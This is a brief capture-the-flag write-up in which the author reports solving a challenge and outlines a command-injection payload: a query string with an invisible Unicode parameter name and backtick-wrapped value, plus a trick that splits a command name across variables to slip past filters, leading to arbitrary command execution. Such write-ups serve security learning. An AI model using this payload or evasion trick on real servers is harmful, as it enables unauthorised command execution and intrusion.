My name is kaibro
I got the flag.
flag[happy_ðŸŒš_new_year]

My writeup:
after the request:
     ?%E2%81%A3=`$_`;//;
can construct shell command

e.g. ?%E2%81%A3=`$_`;//;a=sle;b=ep;$a$b 10;

and then I can write shellscript or php script to /tmp/


so I write a python script to execute arbitrary cmd

Nice problem
Thanks
